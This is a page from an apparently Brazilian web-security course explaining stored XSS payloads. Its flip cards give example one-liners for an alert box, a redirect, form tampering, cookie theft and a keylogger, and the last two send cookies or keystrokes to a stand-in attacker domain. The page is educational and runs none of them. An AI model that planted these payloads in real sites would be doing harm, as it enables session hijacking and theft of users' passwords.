<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="UTF-8">
<meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="../css/bootstrap.min.css" rel="stylesheet">
    <link href="../css/menu.css" rel="stylesheet">
    <link href="../css/fonts.css" rel="stylesheet">
    <link href="../css/tutorial_before_lab.css" rel="stylesheet">
    <link href="../css/general_config.css" rel="stylesheet">
    <link href="../css/intro.css" rel="stylesheet">
    <script src="../js/jquery.js"></script>
    <script src="../js/popper.min.js"></script>
    <script src="../js/bootstrap.min.js"></script>
    <script src="../js/bootstrap.js"></script>
    <script src="../js/bootstrap.bundle.min.js"></script>
    <script src="../js/bootstrap.bundle.js"></script>
    <script src="../js/scriptGlossario.js"></script>
    <script src="../js/bootstrap.min4.5.js"></script>
    <title>XSS Armazenado</title>
</head>

<style>
body{
  overflow-x: hidden;
}

.container-buttons{
  margin-top: 20px;
}
.image-container img {
    height: auto;
    display: block;
  }

  .container-robot {
    border-radius: 3px;
    width: 100%;
    padding: 0;
    display: block;
    margin: auto auto;
    transform: translate(9vw, 50px);
  }

.robot-speech::after {
    content: '';
    height: 25px;
    position: absolute;
    z-index: 1;
    border-bottom: 30px solid #fff; 
    border-right: 20px solid transparent; 
    top: 35px; 
    right: -15px; 
    transform: rotate(-230deg); 
}

.robot-speech {
    max-width: 30vw;
    min-height: 80px;
    margin-right: auto; 
    margin-left: auto;
    transform: translateX(-14vw) translateY(-170px); 
}

@media(max-width:830px){
    .robot{
      transform: scale(0.8) translate(90px, -10px);;
    }
    .robot-speech{
      max-width: 60%;
      transform: translateX(-16vw) translateY(-170px); 
      margin-bottom: 90px;
  }
  }
  
  @media(max-width:1300px){
    .robot-speech{
      transform: translateX(-14vw) translateY(-170px); 
      margin-bottom: 90px;
  }
}
  
   @media(min-width:2400px){
    .robot-speech{
      transform: translateX(-15vw) translateY(-170px); 
  }
   }

  .writer{
    text-align: justify;
    justify-content: left;
    margin-bottom: 0px;
  }


</style>

<body>
<div style="display: flex; width: 100%;">



  <?php include '../menu_lateral_interm.php'; ?>
  <div class="content" style="margin-right: 0px">
  <div class="central-box" >
    <div class="central-text">
      <h3 class="title">Payloads XSS</h3>
      <div id="first-text">
        <p>
        O conteúdo das seções anteriores mostrou o funcionamento do protocolo HTTP e dos cookies, um mecanismo usado pelo HTTP para identificar usuários. E como isso se relaciona com o XSS? Você se lembra que o XSS é um tipo vulnerabilidade que existe em aplicações Web e que permite que atacantes insiram código malicioso em uma página Web acessada por usuários legítimos, certo? Esse código malicioso injetado é chamado de payload XSS ou carga útil XSS. O payload pode ser usado para roubar cookies de um usuário, que como visto, é uma informação sensível que identifica esse usuário e pode dar acesso a recursos que só poderiam ser acessados por ele. Um payload pode também fazer ações em nome do usuário como comentários em uma página Web e compras em um comércio eletrônico. 
        </p>
          
        <p>
        Os payloads XSS variam de scripts simples para fazerem uma mensagem de pop-up aparecer no navegador do usuário, como foi visto nas atividades de laboratório do nível iniciante, até ataques mais complexos como manipulação do conteúdo de uma página Web e roubo de cookies, que serão tema das atividades de laboratório do nível intermediário.
        </p>
        <p>
        Alguns tipos de payload são:
        </p>
      </div>
    </div>

    <div id = "container-cards">
      <div class="card" id='card1'>
      <div class="card-inner">
        <div class="card-front">
        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-exclamation-triangle" viewBox="0 0 16 16">
        <path d="M7.938 2.016A.13.13 0 0 1 8.002 2a.13.13 0 0 1 .063.016.15.15 0 0 1 .054.057l6.857 11.667c.036.06.035.124.002.183a.2.2 0 0 1-.054.06.1.1 0 0 1-.066.017H1.146a.1.1 0 0 1-.066-.017.2.2 0 0 1-.054-.06.18.18 0 0 1 .002-.183L7.884 2.073a.15.15 0 0 1 .054-.057m1.044-.45a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767z"/>
        <path d="M7.002 12a1 1 0 1 1 2 0 1 1 0 0 1-2 0M7.1 5.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0z"/>
        </svg>
          <h3 style="margin: 0px">Box de alerta</h2>
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" class="bottom-symbol bi bi-hand-index-thumb" viewBox="0 0 16 16">
              <path d="M6.75 1a.75.75 0 0 1 .75.75V8a.5.5 0 0 0 1 0V5.467l.086-.004c.317-.012.637-.008.816.027.134.027.294.096.448.182.077.042.15.147.15.314V8a.5.5 0 0 0 1 0V6.435l.106-.01c.316-.024.584-.01.708.04.118.046.3.207.486.43.081.096.15.19.2.259V8.5a.5.5 0 1 0 1 0v-1h.342a1 1 0 0 1 .995 1.1l-.271 2.715a2.5 2.5 0 0 1-.317.991l-1.395 2.442a.5.5 0 0 1-.434.252H6.118a.5.5 0 0 1-.447-.276l-1.232-2.465-2.512-4.185a.517.517 0 0 1 .809-.631l2.41 2.41A.5.5 0 0 0 6 9.5V1.75A.75.75 0 0 1 6.75 1M8.5 4.466V1.75a1.75 1.75 0 1 0-3.5 0v6.543L3.443 6.736A1.517 1.517 0 0 0 1.07 8.588l2.491 4.153 1.215 2.43A1.5 1.5 0 0 0 6.118 16h6.302a1.5 1.5 0 0 0 1.302-.756l1.395-2.441a3.5 3.5 0 0 0 .444-1.389l.271-2.715a2 2 0 0 0-1.99-2.199h-.581a5 5 0 0 0-.195-.248c-.191-.229-.51-.568-.88-.716-.364-.146-.846-.132-1.158-.108l-.132.012a1.26 1.26 0 0 0-.56-.642 2.6 2.6 0 0 0-.738-.288c-.31-.062-.739-.058-1.05-.046zm2.094 2.025"/>
            </svg>
          </div>
        <div class="card-back">
          <p class="back-text theoric-content">
          É um payload de prova de conceito que exibe uma mensagem de pop-up para o usuário legítimo no seu navegador; usado para testar vulnerabilidades XSS e servir de ponto de partida para ataques mais sofisticados. Exemplo de código:
            <br> &lt;script&gt;alert("Meu primeiro XSS")&lt;/script&gt;
        </p>
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" class="bottom-symbol bi bi-arrow-counterclockwise" viewBox="0 0 16 16">
            <path fill-rule="evenodd" d="M8 3a5 5 0 1 1-4.546 2.914.5.5 0 0 0-.908-.417A6 6 0 1 0 8 2z"/>
            <path d="M8 4.466V.534a.25.25 0 0 0-.41-.192L5.23 2.308a.25.25 0 0 0 0 .384l2.36 1.966A.25.25 0 0 0 8 4.466"/>
          </svg>
        </div>

      </div>
      </div>

      <div class="card" id='card2'>
        <div class="card-inner">
          <div class="card-front">
          <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="symbol bi bi-arrow-return-right" viewBox="0 0 16 16">
          <path fill-rule="evenodd" d="M1.5 1.5A.5.5 0 0 0 1 2v4.8a2.5 2.5 0 0 0 2.5 2.5h9.793l-3.347 3.346a.5.5 0 0 0 .708.708l4.2-4.2a.5.5 0 0 0 0-.708l-4-4a.5.5 0 0 0-.708.708L13.293 8.3H3.5A1.5 1.5 0 0 1 2 6.8V2a.5.5 0 0 0-.5-.5"/>
          </svg>
            <h3 style="margin: 0px">Redirecionamento</h2>
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" class="bottom-symbol bi bi-hand-index-thumb" viewBox="0 0 16 16">
              <path d="M6.75 1a.75.75 0 0 1 .75.75V8a.5.5 0 0 0 1 0V5.467l.086-.004c.317-.012.637-.008.816.027.134.027.294.096.448.182.077.042.15.147.15.314V8a.5.5 0 0 0 1 0V6.435l.106-.01c.316-.024.584-.01.708.04.118.046.3.207.486.43.081.096.15.19.2.259V8.5a.5.5 0 1 0 1 0v-1h.342a1 1 0 0 1 .995 1.1l-.271 2.715a2.5 2.5 0 0 1-.317.991l-1.395 2.442a.5.5 0 0 1-.434.252H6.118a.5.5 0 0 1-.447-.276l-1.232-2.465-2.512-4.185a.517.517 0 0 1 .809-.631l2.41 2.41A.5.5 0 0 0 6 9.5V1.75A.75.75 0 0 1 6.75 1M8.5 4.466V1.75a1.75 1.75 0 1 0-3.5 0v6.543L3.443 6.736A1.517 1.517 0 0 0 1.07 8.588l2.491 4.153 1.215 2.43A1.5 1.5 0 0 0 6.118 16h6.302a1.5 1.5 0 0 0 1.302-.756l1.395-2.441a3.5 3.5 0 0 0 .444-1.389l.271-2.715a2 2 0 0 0-1.99-2.199h-.581a5 5 0 0 0-.195-.248c-.191-.229-.51-.568-.88-.716-.364-.146-.846-.132-1.158-.108l-.132.012a1.26 1.26 0 0 0-.56-.642 2.6 2.6 0 0 0-.738-.288c-.31-.062-.739-.058-1.05-.046zm2.094 2.025"/>
            </svg>
            </div>
          <div class="card-back">
            <p class="back-text">
            É um payload que redireciona o usuário legítimo para uma outra página Web, diferente da que o usuário legítimo gostaria de acessar, geralmente, essa outra página é um phishing ou uma página controlada pelo atacante. Exemplo de código:       
            <br>  &lt;script&gt;window.location.href="https://lojahackersdobemfake.com.br"&lt;/script&gt;
            </p>
              <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" class="bottom-symbol bi bi-arrow-counterclockwise" viewBox="0 0 16 16">
              <path fill-rule="evenodd" d="M8 3a5 5 0 1 1-4.546 2.914.5.5 0 0 0-.908-.417A6 6 0 1 0 8 2z"/>
              <path d="M8 4.466V.534a.25.25 0 0 0-.41-.192L5.23 2.308a.25.25 0 0 0 0 .384l2.36 1.966A.25.25 0 0 0 8 4.466"/>
            </svg>
          </div>
          </div>
      </div>

      <div class="card" id='card3'>
        <div class="card-inner">
          <div class="card-front">
            <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-cookie symbol" viewBox="0 0 16 16">
            <path d="M6 7.5a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0m4.5.5a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3m-.5 3.5a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0"/>
            <path d="M8 0a7.96 7.96 0 0 0-4.075 1.114q-.245.102-.437.28A8 8 0 1 0 8 0m3.25 14.201a1.5 1.5 0 0 0-2.13.71A7 7 0 0 1 8 15a6.97 6.97 0 0 1-3.845-1.15 1.5 1.5 0 1 0-2.005-2.005A6.97 6.97 0 0 1 1 8c0-1.953.8-3.719 2.09-4.989a1.5 1.5 0 1 0 2.469-1.574A7 7 0 0 1 8 1c1.42 0 2.742.423 3.845 1.15a1.5 1.5 0 1 0 2.005 2.005A6.97 6.97 0 0 1 15 8c0 .596-.074 1.174-.214 1.727a1.5 1.5 0 1 0-1.025 2.25 7 7 0 0 1-2.51 2.224Z"/>
            </svg>
            <h3 style="margin: 0px">Roubo de Cookies</h2>
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" class="bottom-symbol bi bi-hand-index-thumb" viewBox="0 0 16 16">
              <path d="M6.75 1a.75.75 0 0 1 .75.75V8a.5.5 0 0 0 1 0V5.467l.086-.004c.317-.012.637-.008.816.027.134.027.294.096.448.182.077.042.15.147.15.314V8a.5.5 0 0 0 1 0V6.435l.106-.01c.316-.024.584-.01.708.04.118.046.3.207.486.43.081.096.15.19.2.259V8.5a.5.5 0 1 0 1 0v-1h.342a1 1 0 0 1 .995 1.1l-.271 2.715a2.5 2.5 0 0 1-.317.991l-1.395 2.442a.5.5 0 0 1-.434.252H6.118a.5.5 0 0 1-.447-.276l-1.232-2.465-2.512-4.185a.517.517 0 0 1 .809-.631l2.41 2.41A.5.5 0 0 0 6 9.5V1.75A.75.75 0 0 1 6.75 1M8.5 4.466V1.75a1.75 1.75 0 1 0-3.5 0v6.543L3.443 6.736A1.517 1.517 0 0 0 1.07 8.588l2.491 4.153 1.215 2.43A1.5 1.5 0 0 0 6.118 16h6.302a1.5 1.5 0 0 0 1.302-.756l1.395-2.441a3.5 3.5 0 0 0 .444-1.389l.271-2.715a2 2 0 0 0-1.99-2.199h-.581a5 5 0 0 0-.195-.248c-.191-.229-.51-.568-.88-.716-.364-.146-.846-.132-1.158-.108l-.132.012a1.26 1.26 0 0 0-.56-.642 2.6 2.6 0 0 0-.738-.288c-.31-.062-.739-.058-1.05-.046zm2.094 2.025"/>
            </svg>
            </div>
          <div class="card-back">
            <p class="back-text theoric-content">
            É um payload que rouba o cookie de um usuário e envia esse cookie para o servidor do atacante. Com isso, o atacante é capaz de sequestrar a sessão do usuário em uma página ou roubar informação sensível contida no cookie, como seu identificador. Exemplo de código:
              <br>  &lt;script&gt;new Image().src="https://lojahackersdobemfake.com.br/rouba_cookie.php?cookie="+document.cookie&lt;/script&gt;    
            </p>
              <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" class="bottom-symbol bi bi-arrow-counterclockwise" viewBox="0 0 16 16">
              <path fill-rule="evenodd" d="M8 3a5 5 0 1 1-4.546 2.914.5.5 0 0 0-.908-.417A6 6 0 1 0 8 2z"/>
              <path d="M8 4.466V.534a.25.25 0 0 0-.41-.192L5.23 2.308a.25.25 0 0 0 0 .384l2.36 1.966A.25.25 0 0 0 8 4.466"/>
            </svg>

          </div>
        </div>
      </div>
      <div class="card" id='card4'>
        <div class="card-inner">
          <div class="card-front">
          <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="symbol bi bi-keyboard" viewBox="0 0 16 16">
          <path d="M14 5a1 1 0 0 1 1 1v5a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V6a1 1 0 0 1 1-1zM2 4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
          <path d="M13 10.25a.25.25 0 0 1 .25-.25h.5a.25.25 0 0 1 .25.25v.5a.25.25 0 0 1-.25.25h-.5a.25.25 0 0 1-.25-.25zm0-2a.25.25 0 0 1 .25-.25h.5a.25.25 0 0 1 .25.25v.5a.25.25 0 0 1-.25.25h-.5a.25.25 0 0 1-.25-.25zm-5 0A.25.25 0 0 1 8.25 8h.5a.25.25 0 0 1 .25.25v.5a.25.25 0 0 1-.25.25h-.5A.25.25 0 0 1 8 8.75zm2 0a.25.25 0 0 1 .25-.25h1.5a.25.25 0 0 1 .25.25v.5a.25.25 0 0 1-.25.25h-1.5a.25.25 0 0 1-.25-.25zm1 2a.25.25 0 0 1 .25-.25h.5a.25.25 0 0 1 .25.25v.5a.25.25 0 0 1-.25.25h-.5a.25.25 0 0 1-.25-.25zm-5-2A.25.25 0 0 1 6.25 8h.5a.25.25 0 0 1 .25.25v.5a.25.25 0 0 1-.25.25h-.5A.25.25 0 0 1 6 8.75zm-2 0A.25.25 0 0 1 4.25 8h.5a.25.25 0 0 1 .25.25v.5a.25.25 0 0 1-.25.25h-.5A.25.25 0 0 1 4 8.75zm-2 0A.25.25 0 0 1 2.25 8h.5a.25.25 0 0 1 .25.25v.5a.25.25 0 0 1-.25.25h-.5A.25.25 0 0 1 2 8.75zm11-2a.25.25 0 0 1 .25-.25h.5a.25.25 0 0 1 .25.25v.5a.25.25 0 0 1-.25.25h-.5a.25.25 0 0 1-.25-.25zm-2 0a.25.25 0 0 1 .25-.25h.5a.25.25 0 0 1 .25.25v.5a.25.25 0 0 1-.25.25h-.5a.25.25 0 0 1-.25-.25zm-2 0A.25.25 0 0 1 9.25 6h.5a.25.25 0 0 1 .25.25v.5a.25.25 0 0 1-.25.25h-.5A.25.25 0 0 1 9 6.75zm-2 0A.25.25 0 0 1 7.25 6h.5a.25.25 0 0 1 .25.25v.5a.25.25 0 0 1-.25.25h-.5A.25.25 0 0 1 7 6.75zm-2 0A.25.25 0 0 1 5.25 6h.5a.25.25 0 0 1 .25.25v.5a.25.25 0 0 1-.25.25h-.5A.25.25 0 0 1 5 6.75zm-3 0A.25.25 0 0 1 2.25 6h1.5a.25.25 0 0 1 .25.25v.5a.25.25 0 0 1-.25.25h-1.5A.25.25 0 0 1 2 6.75zm0 4a.25.25 0 0 1 .25-.25h.5a.25.25 0 0 1 .25.25v.5a.25.25 0 0 1-.25.25h-.5a.25.25 0 0 1-.25-.25zm2 0a.25.25 0 0 1 .25-.25h5.5a.25.25 0 0 1 .25.25v.5a.25.25 0 0 1-.25.25h-5.5a.25.25 0 0 1-.25-.25z"/>
          </svg>
            <h3 style="margin: 0px">Registro do Teclado</h2>
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" class="bottom-symbol bi bi-hand-index-thumb" viewBox="0 0 16 16">
              <path d="M6.75 1a.75.75 0 0 1 .75.75V8a.5.5 0 0 0 1 0V5.467l.086-.004c.317-.012.637-.008.816.027.134.027.294.096.448.182.077.042.15.147.15.314V8a.5.5 0 0 0 1 0V6.435l.106-.01c.316-.024.584-.01.708.04.118.046.3.207.486.43.081.096.15.19.2.259V8.5a.5.5 0 1 0 1 0v-1h.342a1 1 0 0 1 .995 1.1l-.271 2.715a2.5 2.5 0 0 1-.317.991l-1.395 2.442a.5.5 0 0 1-.434.252H6.118a.5.5 0 0 1-.447-.276l-1.232-2.465-2.512-4.185a.517.517 0 0 1 .809-.631l2.41 2.41A.5.5 0 0 0 6 9.5V1.75A.75.75 0 0 1 6.75 1M8.5 4.466V1.75a1.75 1.75 0 1 0-3.5 0v6.543L3.443 6.736A1.517 1.517 0 0 0 1.07 8.588l2.491 4.153 1.215 2.43A1.5 1.5 0 0 0 6.118 16h6.302a1.5 1.5 0 0 0 1.302-.756l1.395-2.441a3.5 3.5 0 0 0 .444-1.389l.271-2.715a2 2 0 0 0-1.99-2.199h-.581a5 5 0 0 0-.195-.248c-.191-.229-.51-.568-.88-.716-.364-.146-.846-.132-1.158-.108l-.132.012a1.26 1.26 0 0 0-.56-.642 2.6 2.6 0 0 0-.738-.288c-.31-.062-.739-.058-1.05-.046zm2.094 2.025"/>
            </svg>
            </div>
          <div class="card-back">
            <p class="back-text theoric-content">
            É um payload que registra as ações de pressionar teclas do teclado por um usuário e envia esses registros para o servidor do atacante. Com isso, o atacante é capaz de roubar informações sensíveis como senhas e números de cartão de crédito. Exemplos de código: 
            <br>  &lt;script&gt;document.onkeypress = function(e) { new Image().src = "https:///lojahackersdobemfake.com.br/keylog.php?k=" + e.keyCode; }&lt;/script&gt;
            </p>
              <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" class="bottom-symbol bi bi-arrow-counterclockwise" viewBox="0 0 16 16">
              <path fill-rule="evenodd" d="M8 3a5 5 0 1 1-4.546 2.914.5.5 0 0 0-.908-.417A6 6 0 1 0 8 2z"/>
              <path d="M8 4.466V.534a.25.25 0 0 0-.41-.192L5.23 2.308a.25.25 0 0 0 0 .384l2.36 1.966A.25.25 0 0 0 8 4.466"/>
            </svg>

          </div>
        </div>
      </div>

      <div class="card" id='card5'>
        <div class="card-inner">
          <div class="card-front">
            <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="symbol bi bi-file-earmark-text" viewBox="0 0 16 16">
            <path d="M5.5 7a.5.5 0 0 0 0 1h5a.5.5 0 0 0 0-1zM5 9.5a.5.5 0 0 1 .5-.5h5a.5.5 0 0 1 0 1h-5a.5.5 0 0 1-.5-.5m0 2a.5.5 0 0 1 .5-.5h2a.5.5 0 0 1 0 1h-2a.5.5 0 0 1-.5-.5"/>
            <path d="M9.5 0H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V4.5zm0 1v2A1.5 1.5 0 0 0 11 4.5h2V14a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1z"/>
            </svg>
            <h3 style="margin: 0px">Sequestro de Formulários</h2>
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" class="bottom-symbol bi bi-hand-index-thumb" viewBox="0 0 16 16">
              <path d="M6.75 1a.75.75 0 0 1 .75.75V8a.5.5 0 0 0 1 0V5.467l.086-.004c.317-.012.637-.008.816.027.134.027.294.096.448.182.077.042.15.147.15.314V8a.5.5 0 0 0 1 0V6.435l.106-.01c.316-.024.584-.01.708.04.118.046.3.207.486.43.081.096.15.19.2.259V8.5a.5.5 0 1 0 1 0v-1h.342a1 1 0 0 1 .995 1.1l-.271 2.715a2.5 2.5 0 0 1-.317.991l-1.395 2.442a.5.5 0 0 1-.434.252H6.118a.5.5 0 0 1-.447-.276l-1.232-2.465-2.512-4.185a.517.517 0 0 1 .809-.631l2.41 2.41A.5.5 0 0 0 6 9.5V1.75A.75.75 0 0 1 6.75 1M8.5 4.466V1.75a1.75 1.75 0 1 0-3.5 0v6.543L3.443 6.736A1.517 1.517 0 0 0 1.07 8.588l2.491 4.153 1.215 2.43A1.5 1.5 0 0 0 6.118 16h6.302a1.5 1.5 0 0 0 1.302-.756l1.395-2.441a3.5 3.5 0 0 0 .444-1.389l.271-2.715a2 2 0 0 0-1.99-2.199h-.581a5 5 0 0 0-.195-.248c-.191-.229-.51-.568-.88-.716-.364-.146-.846-.132-1.158-.108l-.132.012a1.26 1.26 0 0 0-.56-.642 2.6 2.6 0 0 0-.738-.288c-.31-.062-.739-.058-1.05-.046zm2.094 2.025"/>
            </svg>
            </div>
          <div class="card-back">
            <p class="back-text theoric-content">
            Esse payload intercepta dados de formulários em requisições HTTP antes de serem recebidos pelo servidor, permitindo que o atacante roube informações sensíveis ou modifique o conteúdo da mensagem que assim será interpretado e/ou armazenado pelo servidor HTTP de forma diferente da qual foi gerado pelo usuário legítimo. Exemplo de código:
            <br>  &lt;script&gt;document.forms[0].onsubmit = function() {document.forms[0].elements[0].value="hacker_do_mal";}&lt;/script&gt;
              <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" class="bottom-symbol bi bi-arrow-counterclockwise" viewBox="0 0 16 16">
              <path fill-rule="evenodd" d="M8 3a5 5 0 1 1-4.546 2.914.5.5 0 0 0-.908-.417A6 6 0 1 0 8 2z"/>
              <path d="M8 4.466V.534a.25.25 0 0 0-.41-.192L5.23 2.308a.25.25 0 0 0 0 .384l2.36 1.966A.25.25 0 0 0 8 4.466"/>
            </svg>

          </div>
        </div>
      </div>
    </div>

    <div class ="container-robot">
          <div class="robot d-inline-flex align-items-center justify-content-center">
              <img src="../img/robot.png" alt="robot-icon" width="200px" height="200px">
          </div>
          <div class="robot-speech">
              <p class="writer">
              Entendendo o funcionamento de diversos tipos de payload, que tal explorarmos um pouco mais na prática os laboratórios de votação e roubo de cookies agora para o XSS Armazenado?
              </p>
          </div>

    </div>
    </div>
    <div class="container-buttons">
      <a href="./interm_intro_armazenado2.php" draggable = "false" style="color: white; text-decoration: none;">
          <div class="btn btn-primary transition-button" id="transition-back">
              &lt;&lt;Retornar 
          </div>
      </a> 
      <a href="../tutoriais_intermediario/lab1-armazenado1.php"  draggable = "false" style="color: white; text-decoration: none;">
          <div class="btn btn-primary transition-button" id="transition-next">
          Prosseguir&gt;&gt;
          </div>
      </a> 
      </div>
  </div>
</div>
</div>
</div>
</div>
</div>

<script src="../js/menuLateral.js"></script>
<script src="../js/writerTutorial.js"></script>


<script>
document.querySelectorAll('.card').forEach(card => {
    card.onclick=_=>card.classList.toggle('flip');
});
function fitText(cardsClassName) { /*Faz com que todos os cards tenham a mesma fonte: Aquela que couber no mais apertado */
    const maxFontSize = 30;
    const minFontSize = 1; 
    let fontSizeSentinela = 31;
    const cards = document.getElementsByClassName(cardsClassName);
    
    if (cards.length === 0) return;

    for (let i = 0; i < cards.length; i++) {
        let card = cards[i];
        let fontSize = maxFontSize;
        card.style.fontSize = fontSize + 'px';

        let contentWidth = card.scrollWidth;
        let contentHeight = card.scrollHeight - 20;
        let width = card.clientWidth;
        let height = card.clientHeight; 
        while ((contentHeight > height || contentWidth > width) && fontSize > minFontSize) {
            fontSize--;
            card.style.fontSize = fontSize + 'px';
            contentWidth = card.scrollWidth;
            contentHeight = card.scrollHeight;
        }
        if(fontSize < fontSizeSentinela){
          fontSizeSentinela = fontSize;
        }
        console.log(contentHeight);
    }
    for (let i = 0; i < cards.length; i++) {      
        let card = cards[i];
        if(parseInt(card.style.fontSize) > fontSizeSentinela){
            card.style.fontSize = fontSizeSentinela + 'px';
            console.log(fontSizeSentinela);
        }
    }
    
}
        window.onload = function() {
            fitText('card-back');
        };
        window.onresize= function() {
            fitText('card-back');
        };
</script>



</body>
</html>

